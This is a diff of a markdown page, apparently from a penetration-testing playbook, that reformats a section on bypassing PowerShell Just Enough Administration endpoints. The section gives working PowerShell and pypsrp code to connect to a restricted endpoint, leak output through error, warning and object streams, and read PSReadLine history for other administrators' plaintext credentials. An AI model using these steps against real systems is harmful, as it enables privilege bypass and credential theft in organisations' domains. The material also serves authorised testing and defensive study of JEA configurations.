@@ -6,20 +6,22 @@ title: "07 · JEA (Just Enough Administration) Bypass"
 
 > Restricted PowerShell endpoints leak through non-default streams.
 
-!!! note "Phase overview"
-    JEA endpoints expose a curated subset of PowerShell to admins (think: the helpdesk can restart services but nothing else). They lock down the success stream, what you see when you run a command. But PowerShell has multiple streams (error, warning, verbose, debug, information), and JEA configs frequently filter only the success/output stream. If you can route data through a different stream, you bypass the filter entirely.
+> **Phase overview**
+>
+> JEA endpoints expose a curated subset of PowerShell to admins (think: the helpdesk can restart services but nothing else). They lock down the success stream, what you see when you run a command. But PowerShell has multiple streams (error, warning, verbose, debug, information), and JEA configs frequently filter only the success/output stream. If you can route data through a different stream, you bypass the filter entirely.
 
 ### 7.1 · JEA Detection + Stream Bypass
 
-!!! info "Why this works / how it chains"
+> **Why this works / how it chains**
+>
+> Connect to the JEA endpoint (note ConfigurationName, not the default). Then test exfil through every stream: throw an exception (error), Write-Warning (warning), or wrap output in a PSCustomObject (object). Most JEA configs only filter the success stream; the others leak data freely. PSReadLine command history is the highest-value target since it often contains plaintext credentials from other admins.
 
-    Connect to the JEA endpoint (note ConfigurationName, not the default). Then test exfil through every stream: throw an exception (error), Write-Warning (warning), or wrap output in a PSCustomObject (object). Most JEA configs only filter the success stream; the others leak data freely. PSReadLine command history is the highest-value target since it often contains plaintext credentials from other admins.
-
-!!! warning "What leads here"
-    - Account has access to a restricted WinRM endpoint
-    - JEA configuration_name is not 'Microsoft.PowerShell'
-    - Success stream filtered but error/warning/object streams may not be
-    - Signs: evil-winrm connects but most cmdlets are restricted
+> **What leads here**
+>
+> - Account has access to a restricted WinRM endpoint
+> - JEA configuration_name is not 'Microsoft.PowerShell'
+> - Success stream filtered but error/warning/object streams may not be
+> - Signs: evil-winrm connects but most cmdlets are restricted
 
 ```powershell title="Detect JEA endpoint"
 # Some examples:
@@ -30,14 +32,15 @@ title: "07 · JEA (Just Enough Administration) Bypass"
 
 # Connect to JEA endpoint
 $cred = New-PSCredential "domain\user" (ConvertTo-SecureString "pass" -AsPlainText -Force)
-Enter-PSSession -ComputerName dc1.domain.local \
-  -ConfigurationName restricted \
+Enter-PSSession -ComputerName dc1.domain.local `
+  -ConfigurationName restricted `
   -Credential $cred
 
 # Check what cmdlets are available
 Get-Command
 ```
 
+{% raw %}
 ```python title="Stream-leak bypass via pypsrp"
 # Use pypsrp to test multiple output streams
 from pypsrp.powershell import PowerShell, RunspacePool
@@ -67,6 +70,7 @@ with RunspacePool(wsman, configuration_name='restricted') as pool:
     output = ps.invoke()
     for o in output: print(o)
 ```
+{% endraw %}
 
 ```powershell title="PSReadLine history: credential goldmine"
 # Check history file first - contains commands with credentials
@@ -77,4 +81,3 @@ Get-Content $HIST
 # $cred = New-Object PSCredential("user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
 # Enter-PSSession -ComputerName X -Credential $cred
 ```
-
